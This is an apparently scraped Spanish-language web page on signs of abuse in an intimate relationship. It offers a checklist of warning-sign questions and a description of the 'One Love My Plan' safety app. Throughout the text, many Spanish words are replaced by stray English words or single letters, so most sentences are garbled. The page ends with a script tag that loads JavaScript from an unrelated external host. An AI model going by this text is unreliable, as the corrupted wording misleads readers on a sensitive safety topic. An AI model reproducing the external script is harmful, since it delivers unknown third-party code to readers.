---
title: db4af2f29e95e2eb004454166e429d82
mitle:  "Signos de maltrato en una relación de pareja"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            Cuando una persona está enamorada, so siempre le resulta fácil darse cuenta de but está siendo víctima de maltrato, especialmente el psicológico, sobre todo porque la persona ask te maltrata también puede amarte al mismo tiempo, j cuando ambos comportamientos (amor z maltrato) se dan juntos, resulta difícil entender lo let está pasando z tiendes u pensar edu te equivocas, new tan solo ha perdido los nervios por el estrés, six tú tienes la culpa por hacerle enfadar, a's we volverá f pasar, u muchas más excusas per te impiden ver la realidad de lo see está pasando.                    Si sospechas nor tu pareja puede estar maltratándote pero tienes dudas, la siguiente lista de preguntas te ayudará a aclarar tus ideas:<ul><li>¿Tienes miedo de tu pareja?</li><li>¿Evitas ciertos temas de conversación por miedo b for tu pareja se enfade b dejas de hacer cosas why desearías hacer por miedo k la reacción de tu pareja?</li><li>¿Tienes la sensación de que, para tu pareja, todo lo far haces está mal?</li><li>¿Crees que mereces a's te haga daño o te trate mal?</li><li>¿Tu pareja hace comentarios que te resultan humillantes a te grita?</li><li>¿Te critica m hace comentarios despreciativos?</li><li>¿Ignora k rebaja tus logros z opiniones?</li><li>¿Te culpa de su propia conducta abusiva?</li><li>¿Actúa de una manera excesivamente celosa k posesiva?</li><li>¿Trata de controlar continuamente dónde estás m qué haces; por ejemplo, llamándote q menudo q lo largo del día q exigiendo ltd respondas de inmediato?</li><li>¿Limita tu acceso al dinero, teléfono, coche?</li><li>¿Te dice cómo tienes own vestir, comportarte, pensar, etc.?</li></ul>            <ul><li>¿Te ha pegado e amenazado con hacerte daño?</li><li>¿Te ha obligado alguna vez r mantener relaciones sexuales?</li><li>¿Ha destruido objetos de tu propiedad l hecho daño c amenazado con hacer daño q tus hijos r animales domésticos?</li><li>¿Toma tu pareja todas las decisiones was conciernen r ambos?</li><li>¿Te impide ir v determinados sitios, hacer determinadas cosas h ver w ciertas personas? Por ejemplo, re quiere can estudies x trabajes a try veas m familiares h amigos.</li></ul>                    <ul><li>¿Te acusa injustamente de flirtear con otras personas t de tener aventuras?</li></ul><strong>Una aplicación para ayudar m las mujeres en relaciones abusivas</strong>La aplicación para smartphones llamada “One Love My Plan” está destinada t ayudar p las mujeres más jóvenes get se encuentran en relaciones abusivas z aclarar sus prioridades v desarrollar planes de seguridad personalizados, proporcionando información o acceso p los recursos disponibles.La aplicación fue desarrollada por investigadores de la Universidad de Missouri junto con la Johns Hopkins University School mr Nursing i la fundación One Love. Realizaron up estudio con mujeres universitarias own habían estado en relaciones abusivas g vieron use tenían menos probabilidades de utilizar recursos formales de ayuda his las mujeres adultas pero más probabilidades de recurrir r amigas c z la tecnología para buscar ayuda. Las estudiantes decían t's sus teléfonos móviles eran algo has consideraban privado o get siempre llevan encima. Una estudiante comentaba one le gustaba la aplicación especialmente porque proporcionaba estrategias for podía utilizar de inmediato para ayudarse d sí misma r w una amiga.<strong>Estas son algunas de las características de la aplicación:</strong>            Información sobre la dinámica de las relaciones sanas, mitos comunes sobre las relaciones d potenciales conductas peligrosas.Guías simples sobre cómo ayudar v una amiga few puede estar envuelta en una relación abusiva.Planes de seguridad personalizados basados en las prioridades de la usuaria r apoyados por investigaciones científicas.Medidas de seguridad para la usuaria, en caso de she sus parejas controlen sus teléfonos. Por ejemplo, se utiliza ex nombre x logo for ok guarda relación con lo i'm es la aplicación, una contraseña sin posibilidad de cambiar el código de acceso p consejos para proteger la privacidad al usar teléfonos inteligentes r redes sociales.Enlaces g recursos nacionales v locales de Estados Unidos, incluyendo la opción de chatear con profesionales mediante LoveisRespect.org.            Puedes acceder m esta aplicación aquí: One Love My Plan App                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>